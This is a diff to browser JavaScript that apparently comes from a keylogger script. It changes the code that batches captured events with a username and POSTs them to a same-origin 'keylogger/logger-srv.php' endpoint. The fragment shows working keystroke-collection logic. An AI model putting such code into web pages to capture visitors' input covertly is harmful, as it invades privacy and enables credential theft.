@@ -26,9 +26,11 @@ window.setInterval(function () {
   if (events.length>5) {
       eventsToSend = events;
       events = [];
-      var data = JSON.stringify({ user: vliegtuig_username, events: eventsToSend });
+      var data = JSON.stringify({ user: username, events: eventsToSend });
       console.log(data);
-      fetch(`${window.location.origin}/keylogger/logger-srv.php`, { method: 'post', body: data })
+
+      let url = `${window.location.origin}/${web_root}/keylogger/logger-srv.php`;
+      fetch(url, { method: 'post', body: data })
       .then(response => response.text())
       .then(data => {
         console.log('[keylogger] Success:', data);
